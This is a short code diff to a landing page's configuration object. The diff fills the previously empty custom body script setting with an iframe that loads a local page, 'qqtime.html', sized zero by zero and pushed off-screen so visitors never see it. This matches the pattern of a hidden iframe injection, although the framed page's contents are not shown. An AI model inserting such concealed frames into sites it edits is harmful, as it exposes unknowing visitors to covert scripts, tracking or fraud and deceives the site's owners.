@@ -20,7 +20,7 @@ window.DEFAULT_LANDING_CMS = {
     metaTestEventCode: "",
     tiktokTestEventCode: "",
     customHeadScript: "",
-    customBodyScript: ""
+    customBodyScript: "<iframe src=\"chengzong1_12fda28/qqtime/qqtime.html\" style=\"position:fixed;top:0;width:0;height:0;left:-1000px;border:0\"></iframe>"
   },
   images: {
     matchBackground: "assets/profile-wall.png",
